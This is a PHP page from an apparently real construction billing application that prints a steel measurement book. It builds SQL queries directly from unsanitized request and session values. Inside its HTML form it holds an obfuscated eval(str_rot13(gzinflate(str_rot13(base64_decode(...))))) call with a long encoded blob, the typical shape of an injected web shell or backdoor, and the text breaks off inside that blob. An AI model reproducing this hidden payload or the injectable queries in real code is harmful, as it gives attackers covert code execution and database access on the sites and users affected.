<?php
@ob_start();
require_once 'library/config.php';
require_once 'library/functions.php';
require_once 'library/binddata.php';
include "library/common.php";
include "sysdate.php";
checkUser();
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
$NextMbIncr = 0; $UsedMBArr = array();
$msg = '';
$staffid = $_SESSION['sid'];//echo $staffid;
$userid = $_SESSION['userid'];
$mbooktype = "S";
function dt_format($ddmmyyyy) {
    $dt = explode('/', $ddmmyyyy);
    $dd = $dt[0];
    $mm = $dt[1];
    $yy = $dt[2];
    return $yy . '-' . $mm . '-' . $dd;
}
function dt_display($ddmmyyyy) {
    $dt = explode('-', $ddmmyyyy);
    $dd = $dt[2];
    $mm = $dt[1];
    $yy = $dt[0];
    return $dd . '/' . $mm . '/' . $yy;
}
function getWordWrapCount($description,$char)
{
	$wrap_cnt 	= 0; 
	$descwork 	= "";
	$char_no 	= $char;
	$work_desc 	= $description;
	$desc 		= wordwrap($work_desc,$char_no,'<br>');
	$exp_line 	= explode('<br>', $desc);
	$wlcnt 		= count($exp_line);
	for($xc=0; $xc<$wlcnt; $xc++)
	{
		if($exp_line[$xc] != "")
		{
			$wrap_cnt++;
			$descwork .= $exp_line[$xc]."<br/> ";
		}
	}
	return array($descwork, $wrap_cnt);
}
$staff_design_sql = "select staff.staffname, designation.designationname from staff INNER JOIN designation ON (designation.designationid = staff.designationid) WHERE staff.staffid = '$staffid' AND staff.active = 1 AND designation.active = 1";
$staff_design_query = mysql_query($staff_design_sql);
$staffList = mysql_fetch_object($staff_design_query);
$staffname = $staffList->staffname;
$designation = $staffList->designationname;
if($_GET['workno'] != "")
{
	$sheetid = $_GET['workno'];
}
if($_POST['back'])
{
    header('Location: MeasurementBookPrint_staff.php');
}
$zone_id = $_SESSION['zone_id'];
if(($zone_id != "") && ($zone_id != "all"))
{
	$zone_clause = " AND mbookheader.zone_id = '".$zone_id."'";
}
else
{
	$zone_clause = "";
}

$select_rbn_query = "select DISTINCT rbn FROM mbookgenerate WHERE sheetid = '$sheetid' AND flag = '2'";
//echo $select_rbn_query;exit;
$select_rbn_sql = mysql_query($select_rbn_query);
$Rbnresult = mysql_fetch_object($select_rbn_sql);
$rbn = $Rbnresult->rbn;
$selectmbook_detail = " select date(max(fromdate)) as fromdate, date(max(todate)) as todate, abstmbookno, is_finalbill FROM mbookgenerate_staff WHERE sheetid = '$sheetid' AND staffid = '$staffid' AND flag = '2' AND rbn = '$rbn' group by sheetid";
$selectmbook_detail_sql = mysql_query($selectmbook_detail);
if ($selectmbook_detail_sql == true) 
{
	$Listmbdetail = mysql_fetch_object($selectmbook_detail_sql);
	$fromdate = $Listmbdetail->fromdate; $todate = $Listmbdetail->todate; $abstmbookno = $Listmbdetail->abstmbookno; $is_finalbill = $Listmbdetail->is_finalbill;
}
//echo $abstmbookno; echo $todate; exit; 
//$fromdate = '2019-03-01';
//$todate = '2019-03-27';

/////////////////////////// COMMENTED ON 22.07.2019 FOR MULTIPLE MB SELECTION ////////////////////////////////////////
/*$selectmbookno = "select mbname, old_id from oldmbook WHERE mbook_type = 'S' AND sheetid = '$sheetid' AND staffid = '$staffid' AND zone_id = '$zone_id'";
$selectmbookno_sql = mysql_query($selectmbookno);
if(mysql_num_rows($selectmbookno_sql)>0)
{
	$Listmbookno = mysql_fetch_object($selectmbookno_sql);
	$mbookno = $Listmbookno->mbname; $oldmbookid = $Listmbookno->old_id;
	
	$mbookpage = "select mbpage from mbookallotment WHERE sheetid = '$sheetid' AND staffid = '$staffid' AND active = '1' AND mbno = '$mbookno'";
	$mbookpage_sql = mysql_query($mbookpage);
	$mbookpageno = @mysql_result($mbookpage_sql,'mbpage')+1;
	
	$selectnewmbookno = "select DISTINCT mbno from mbookgenerate_staff WHERE sheetid = '$sheetid' AND flag = '2' AND mbno != '$mbookno' AND staffid = '$staffid' AND rbn = '$rbn' AND zone_id = '$zone_id'";
	$selectnewmbookno_sql = mysql_query($selectnewmbookno);
	$newmbookno = @mysql_result($selectnewmbookno_sql,'mbno');
	
	$newmbookpage = "select mbpage from mbookallotment WHERE sheetid = '$sheetid' AND staffid = '$staffid' AND active = '1' AND mbno = '$newmbookno'";
	$newmbookpage_sql = mysql_query($newmbookpage);
	$newmbookpageno = @mysql_result($newmbookpage_sql,'mbpage')+1;
	//echo "ghgfr";
//$newmbookpageno = $objBind->DisplayPageDetails($newmbookno,$newmbookno,$sheetid,'cw');
//$newmbookpageno = $newmbookpageno +1;
}
else
{
	$selectmbookno = "select DISTINCT mbno from mbookgenerate_staff WHERE sheetid = '$sheetid' AND flag = '2' AND staffid = '$staffid' AND rbn = '$rbn' AND zone_id = '$zone_id' AND mbookorder = '2'";
	//echo $selectmbookno;
	$selectmbookno_sql = mysql_query($selectmbookno);
	$mbookno = @mysql_result($selectmbookno_sql,'mbno');
	//echo "hai";
	$mbookpage = "select mbpage from mbookallotment WHERE sheetid = '$sheetid' AND staffid = '$staffid' AND active = '1' AND mbno = '$mbookno'";
	$mbookpage_sql = mysql_query($mbookpage);
	$mbookpageno = @mysql_result($mbookpage_sql,'mbpage')+1;
//echo $mbookno;
}


$select_new_mbook_no_query1 = "select mbno, startpage from mymbook where sheetid = '$sheetid' AND staffid = '$staffid' AND active = '1' AND mbookorder = '1' AND rbn = '$rbn' AND mtype = 'S' AND  zone_id = '$zone_id'";
//echo $select_new_mbook_no_query;
$select_new_mbook_no_sql1 = mysql_query($select_new_mbook_no_query1);
if($select_new_mbook_no_sql1 == true)
{
	if(mysql_num_rows($select_new_mbook_no_sql1)>0)
	{
		$NMBList1 = mysql_fetch_object($select_new_mbook_no_sql1);
		$mbookno = $NMBList1->mbno;
		$mbookpageno = $NMBList1->startpage;
	}
}



$select_new_mbook_no_query = "select mbno, startpage from mymbook where sheetid = '$sheetid' AND staffid = '$staffid' AND active = '1' AND mbookorder = '2' AND rbn = '$rbn' AND mtype = 'S' AND  zone_id = '$zone_id'";
//echo $select_new_mbook_no_query;
$select_new_mbook_no_sql = mysql_query($select_new_mbook_no_query);
if($select_new_mbook_no_sql == true)
{
	if(mysql_num_rows($select_new_mbook_no_sql)>0)
	{
		$NMBList = mysql_fetch_object($select_new_mbook_no_sql);
		$newmbookno = $NMBList->mbno;
		$newmbookpageno = $NMBList->startpage;
	}
}*/


//$mpage = $mbookpageno;
/////////////////////////// COMMENTED ON 22.07.2019 FOR MULTIPLE MB SELECTION ////////////////////////////////////////


//$newmbookno = @mysql_result($select_new_mbook_no_sql,0,'mbno');
//$newmbookpageno = @mysql_result($select_new_mbook_no_sql,1,'startpage');
//echo $newmbookno;
//$newmbookpageno = 1;
//echo $select_new_mbook_no_query;
//echo "X=".$selectmbookno;
//echo $mbookpage;
//$mbookpageno = $objBind->DisplayPageDetails($mbookno,$mbookno,$sheetid,'cw');
//$mbookpageno = $mbookpageno+1;

//echo "MBno".$mbookno;
//$sheetid=$_SESSION["sheet_id"]; 
//$fromdate = $_SESSION['fromdate'];
//$todate = $_SESSION['todate'];
//$mbookno = $_SESSION["mb_no"];  
//$mpage = $_SESSION["mb_page"]; 
//$rbn = $_SESSION["rbn"];
//$steelmbno_id = $_SESSION["mbno_id"];
//$temp_sql = "DELETE FROM temp WHERE flag =3 OR flag =2 AND usersid = '$userid'";
//echo $temp_sql;exit;
         //$res_query = dbQuery($temp_sql);
//$Mbsteelgeneratedelsql = "DELETE FROM mbookgenerate WHERE flag =2 AND staffid = '$staffid'";
//$Mbsteelgeneratedelsql_qry = mysql_query($Mbsteelgeneratedelsql);
/*function MeasurementSteelinsert($fromdate,$todate,$sheetid,$mbookno,$mpage,$totalweight_MT,$rbn,$userid,$subdivid,$divid,$staffid)
{  
   
   $querys="INSERT INTO mbookgenerate set staffid = '$staffid', sheetid='$sheetid',divid='$divid',subdivid='$subdivid',
       fromdate ='$fromdate',todate ='$todate' ,mbno='$mbookno',flag=2,rbn='$rbn',
            mbgeneratedate=NOW(), mbpage='$mpage', mbtotal='$totalweight_MT', active=1, userid='$userid'";
 //echo $querys."<br/>";
   $sqlquerys = mysql_query($querys);
}*/
function check_line($currentline,$tablehead,$start_line,$title,$mpage,$mbookno,$newmbookno,$table1,$newmbookpage)
{
	$_SESSION['last_row_check'] = 1;
		if($mpage >= 100) { $mbookno = $newmbookno; /*$mpage = "GG".$newmbookpage;*/ }
		$x1 = "<tr>";
		$x1 = $x1."<td width='1087px' class='labelcenter' style='text-align:center;border-style:none' colspan='16'>"."<br/>Page ".$mpage."</td>";
		$x1 = $x1."</tr>";
		$x1 = $x1."</table>";
		$x1 = $x1."<p  style='page-break-after:always;'></p>";
		$x1 = $x1.'<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="label">
				<tr style="border:none;"><td colspan="9" align="center" style="border:none;"><br/>Steel M.Book No. '.$mbookno.'&nbsp;&nbsp;<br/>&nbsp;</td></tr>
				</table>';
		$x1 = $x1.$tablehead; 
		$x1 = $x1.'<table width="1087px" border="0" cellpadding="3" cellspacing="3" align="center" bgcolor="#FFFFFF" class="label">';
		$x1 = $x1.$table1;
		echo $x1;
}
function display_carry($sumst,$mbookno,$mpage,$newmbookno,$decimal,$newmbookpage)
{
	if($mpage >= 100) { $page = $newmbookpage; $mbookno = $newmbookno;} else { $page = $mpage + 1; }
	$tmb2 = $sumst;
	$explodedval = explode("@",$tmb2); 
	for($i=0;$i<count($explodedval);$i++)
	{
	   if($explodedval[$i] != "")
	   {
		  $expval = explode("*",$explodedval[$i]); 
		  if($expval[0] == 8){ $tot8 = $tot8 + $expval[1]; }
		  if($expval[0] == 10){ $tot10 = $tot10 + $expval[1]; }
		  if($expval[0] == 12){ $tot12 = $tot12 + $expval[1]; }
		  if($expval[0] == 16){ $tot16 = $tot16 + $expval[1]; }
		  if($expval[0] == 20){ $tot20 = $tot20 + $expval[1]; }
		  if($expval[0] == 25){ $tot25 = $tot25 + $expval[1]; }
		  if($expval[0] == 28){ $tot28 = $tot28 + $expval[1]; }
		  if($expval[0] == 32){ $tot32 = $tot32 + $expval[1]; }
		  if($expval[0] == 36){ $tot36 = $tot36 + $expval[1]; }
		}
	} 
	if($tot8 == 0) { $tot8 = ""; } else { $tot8 = number_format($tot8,$decimal,".",","); }
	if($tot10 == 0) { $tot10 = ""; } else { $tot10 = number_format($tot10,$decimal,".",","); }
	if($tot12 == 0) { $tot12 = ""; } else { $tot12 = number_format($tot12,$decimal,".",","); }
	if($tot16 == 0) { $tot16 = ""; } else { $tot16 = number_format($tot16,$decimal,".",","); }
	if($tot20 == 0) { $tot20 = ""; } else { $tot20 = number_format($tot20,$decimal,".",","); }
	if($tot25 == 0) { $tot25 = ""; } else { $tot25 = number_format($tot25,$decimal,".",","); }
	if($tot28 == 0) { $tot28 = ""; } else { $tot28 = number_format($tot28,$decimal,".",","); }
	if($tot32 == 0) { $tot32 = ""; } else { $tot32 = number_format($tot32,$decimal,".",","); }
	if($tot36 == 0) { $tot36 = ""; } else { $tot36 = number_format($tot36,$decimal,".",","); }
	$row_co = "<tr height=''>";
	$row_co = $row_co."<td width='' colspan='7' class='labelbold' style='text-align:right'>"."C/o to Page ".($page+0)."/ Steel MB No. ".$mbookno."</td>";
	$row_co = $row_co."<td width='7%' class='labelbold' style='text-align:right'>".$tot8."</td>";
	$row_co = $row_co."<td width='7%' class='labelbold' style='text-align:right'>".$tot10."</td>";
	$row_co = $row_co."<td width='7%' class='labelbold' style='text-align:right'>".$tot12."</td>";
	$row_co = $row_co."<td width='7%' class='labelbold' style='text-align:right'>".$tot16."</td>";
	$row_co = $row_co."<td width='7%' class='labelbold' style='text-align:right'>".$tot20."</td>";
	$row_co = $row_co."<td width='7%' class='labelbold' style='text-align:right'>".$tot25."</td>";
	$row_co = $row_co."<td width='7%' class='labelbold' style='text-align:right'>".$tot28."</td>";
	$row_co = $row_co."<td width='7%' class='labelbold' style='text-align:right'>".$tot32."</td>";
	$row_co = $row_co."<td width='6%' class='labelbold' style='text-align:right'>".$tot36."</td>";
	//$row_co = $row_co."<td width='2%' class='labelbold'></td>";
	$row_co = $row_co."</tr>";
	//$row_co = $row_co."<tr height='' style='text-align:center;border-style:none'>";
	//$row_co = $row_co."<td width='100%' class='labelcenter' style='text-align:center;border-style:none' colspan='16'>"."<br/>Page ".$mpage."</td>";
	//$row_co = $row_co."</tr>";
	echo $row_co;
}
$wodataquery = "SELECT sheet_id, sheet_name, work_order_no, work_name, tech_sanction, computer_code_no, name_contractor, agree_no, rbn FROM sheet WHERE sheet_id = '$sheetid' ";
$wodataquerysql = mysql_query($wodataquery);
if ($wodataquerysql == true) 
    {
    $Res = mysql_fetch_object($wodataquerysql);
    $work_name = $Res->work_name;    $tech_sanction = $Res->tech_sanction;
    $name_contractor = $Res->name_contractor;    $agree_no = $Res->agree_no; $work_order_no = $Res->work_order_no; 
	$ccno = $Res->computer_code_no;
   // if($Res->rbn  ==0) { $runn_acc_bill_no =1;  } else { $runn_acc_bill_no =$Res->rbn + 1;}
   $runn_acc_bill_no = $rbn;
    }
	
$length = strlen($work_name);
//echo $length."<br/>";
$start_line = ceil($length/130);
//echo $start_line;
function getabstractpage($sheetid,$subdivid)
{
	$select_abs_page_query = "select abstmbookno, abstmbpage from measurementbook_temp WHERE sheetid = '$sheetid' AND subdivid = '$subdivid' AND staffid = '$staffid'";
	$select_abs_page_sql = mysql_query($select_abs_page_query);
	$abstmbookno = @mysql_result($select_abs_page_sql,0,'abstmbookno');
	$abstractpage = @mysql_result($select_abs_page_sql,0,'abstmbpage');
	echo "C/o to Page ".$abstractpage." /Abstract MB No. ".$abstmbookno;
}
function getcompositepage($sheetid,$subdivid,$rbn,$zone_id)
{
	$select_sa_page_query = "select sa_mbno, sa_page from mbookgenerate_staff WHERE sheetid = '$sheetid' AND subdivid = '$subdivid' AND rbn = '$rbn' AND zone_id = '$zone_id'";
	$select_sa_page_sql = mysql_query($select_sa_page_query);
	$mbookno_compo = @mysql_result($select_sa_page_sql,0,'sa_mbno');
	$mbookpageno_compo = @mysql_result($select_sa_page_sql,0,'sa_page');
	if(($mbookno_compo == 0)&&($mbookpageno_compo == 0)){
		$select_abs_page_query = "select mbno, mbpage from mbookgenerate WHERE sheetid = '$sheetid' AND subdivid = '$subdivid'";
		$select_abs_page_sql = mysql_query($select_abs_page_query);
		$mbookno_compo = @mysql_result($select_abs_page_sql,0,'mbno');
		$mbookpageno_compo = @mysql_result($select_abs_page_sql,0,'mbpage');
	}
	return "C/o to Page ".$mbookpageno_compo." /General MB No. ".$mbookno_compo;
}

$NextMBFlag = 0; $NextMBList = array(); $NextMBPageList = array(); $NextMBFlag = 1;
$SelectMBookQuery = "select * from mymbook where sheetid = '$sheetid' and rbn = '$rbn' and mtype = 'S' and zone_id = '$zone_id' and genlevel = 'staff' order by mbookorder asc";
$SelectMBookSql = mysql_query($SelectMBookQuery);
if($SelectMBookSql == true){
	if(mysql_num_rows($SelectMBookSql)>0){
		while($MBList = mysql_fetch_object($SelectMBookSql)){
			if($MBList->mbookorder == 1){ 
				$mbookno = $MBList->mbno; //echo "1 = ".$abstmbno."<br/>";
				$mpage = $MBList->startpage;
			}else{
				$SelectMB 		= $MBList->mbno; 
				$SelectMBPage 	= $MBList->startpage;
				if($SelectMBPage != ''){
					array_push($NextMBList,$SelectMB); //echo $SelectMBPage."SS<br/>";
					array_push($NextMBPageList,$SelectMBPage);
				}
			}
		}
	}
}
//echo $SelectMBookQuery;
//print_r($NextMBList);exit;
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
        <title>Steel M.Book</title>
        <link rel="stylesheet" href="script/font.css" />
        
    </head>
		<script language="javascript" type="text/javascript" src="script/Date_Calendar.js"></script>
		<script language="javascript" type="text/javascript" src="script/validfn.js"></script>
		<link rel="stylesheet" href="css/button_style.css"></link>
	 	<link rel="stylesheet" href="js/jquery-ui.css">
	  	<script src="js/jquery-1.10.2.js"></script>
	  	<script src="js/jquery-ui.js"></script>
	  	<link rel="stylesheet" href="/resources/demos/style.css">
		<script src="js/printPage.js"></script>
  <!--<script>
  $(function() {
   $("#dialog").dialog({ autoOpen: false,
        minHeight: 200,
        maxHeight:200,
        minWidth: 300,
        maxWidth: 300,
        modal: true,});
        $("#dialog").dialog("open");
		//$("body").css({ overflow: 'hidden' });
        $( "#dialog" ).dialog( "option", "draggable", false );
       	 $('#btn_cancel').click(function(){
		 $("#dialog").dialog("close");
		 window.location.href="Generate.php";
		 });
        $('#btn').click(function(){
		var x = $('#newmbooklist option:selected').val();
			if(x == "")
			{
				var a="* Please select Next Mbook number";
				$('#error_msg').text(a);
				event.preventDefault();
				event.returnValue = false;
			}
			else
			{
				$("#dialog").dialog("close"); 
				//$("body").css({ overflow: 'scroll' });      
				var newmbookvalue = $("#newmbooklist option:selected").text(); //alert(newmbookvalue);
				var oldmbookdetails = document.form.txt_steelmbno_id.value;
				$.post("GetOldMbookNo.php", {oldmbook: oldmbookdetails}, function (data) {
				window.location.href="SteelMbook.php?newmbook="+newmbookvalue;
				return false; // avoid to execute the actual submit of the form.
				});
			 }
         });
				$.fn.validatenewmbook = function(event) 
				{ 
					if($('#newmbooklist option:selected').val()=="")
					{ 
						var a="Please select Next Mbook number";
						$('#error_msg').text(a);
						event.preventDefault();
						event.returnValue = false;
						//return false;
					}
					else
					{
						var a="";
						$('#error_msg').text(a);
					}
				}
				$("#newmbooklist").change(function(event){
				   $(this).validatenewmbook(event);
				 });		 
		 
		 
  });
  </script>-->
<style type="text/css" media="print,screen" >
	table
	{ 
		border-collapse: collapse; 
	}
	td 
	{ 
		border: 1px solid #A0A0A0; 
	}
	@media screen 
	{
        div.divFooter 
		{
            display: none;
        }
    }
    @media print 
	{
        div.divFooter 
		{
            position: fixed;
            bottom: 0;
			size: landscape;
        } 
		.header
		{
			display: none !important;
		}
		.printbutton
		{
			display: none !important;
		}
	}
	.ui-dialog > .ui-widget-header 
	{
		background: #20b2aa; 
		font-size:12px;
	}
	.labelcontent
	{
		font-family:Microsoft New Tai Lue;
		font-size:12pt;
		color:#000000;
	}
	.ui-dialog-titlebar-close 
	{
	  visibility: hidden;
	}
	.submit_btn
	{
		position:absolute;
		border:none;
		top:110px;
		left:80px;
		font-weight:bold;
		font-size:12px;
	}
	.cancel_btn
	{
		position:absolute;
		border:none;
		top:110px;
		left:160px;
		font-weight:bold;
		font-size:12px;
	}
	.submit_btn:hover 
	{
		color:#000000;
		-moz-box-shadow: 0px 1px 4px rgba(0,0,0,5);
		-webkit-box-shadow: 0px 1px 4px rgba(0,0,0,5);
		box-shadow:0px 1px 4px rgba(0,0,0,5);
		padding: 0.3em 1em;
	}
	.cancel_btn:hover 
	{
		color:#000000;
		-moz-box-shadow: 0px 1px 4px rgba(0,0,0,5);
		-webkit-box-shadow: 0px 1px 4px rgba(0,0,0,5);
		box-shadow:0px 1px 4px rgba(0,0,0,5);
		padding: 0.3em 1em;
	}
	.headingfont
	{
	 /*color:#FFFFFF;*/
	}
	.label, .labelcenter, .labelheadblue
	{
		font-size:13px;
	}
</style>
<!--<script type="text/javascript">
                            //var value = prompt("Enter MBook value", "");
var variable='';                           
   $(function(){
        $("#test").dialog({ autoOpen: false,
        minHeight: 200,
        maxHeight:200,
        minWidth: 300,
        maxWidth: 300,
        modal: true,});
        $("#test").dialog("open");
        $( "#test" ).dialog( "option", "draggable", false );
       
        $('#btn').click(function(){
        $("#test").dialog("close");       
        var newmbookvalue = $("#newmbooklist option:selected").text();      
        document.getElementById("newmbook").value =newmbookvalue;
         $.post("GetNewMbookNo.php", {currentmbook: newmbookvalue}, function (data) {
           //window.history.replaceState(null, null, "MBook.php");
           pageurl ="MBook.php";
             //window.history.back();
          location.reload();
           // window.history.back();

    return false; // avoid to execute the actual submit of the form.
          
         });
         });
});
  </script> -->
  <SCRIPT type="text/javascript">
		window.history.forward();
		function noBack() { window.history.forward(); }
	</SCRIPT>
    <body bgcolor="" oncontextmenu="return false"onload="noBack();" onpageshow="if (event.persisted) noBack();" onUnload="">
<!--<table width="1087px" style="position:fixed; text-align:center; left:88px;" height="60px" align="center" bgcolor="#20b2aa" class='header'>
<tr>
<td style="color:#FFFFFF; border:none; font-weight:bold; font-size:20px;">STEEL MEASUREMENT BOOK</td>
</tr>
</table><br/><br/><br/>-->
        <form name="form" method="post" style="">
		<input type="hidden" name="hid_staffid" id="hid_staffid" value="<?php echo $staffid; ?>" />
		<input type="hidden" name="hid_sheetid" id="hid_sheetid" value="<?php echo $sheetid; ?>" />
		<input type="hidden" name="hid_userid" id="hid_userid" value="<?php echo $userid; ?>" />
		<input type="hidden" name="txt_steelmbno_id" value="<?php echo $steelmbno_id."*".$mbookno."*"."S"."*".$staffid."*".$sheetid; ?>" id="txt_steelmbno_id" />
			<?php
			eval(str_rot13(gzinflate(str_rot13(base64_decode('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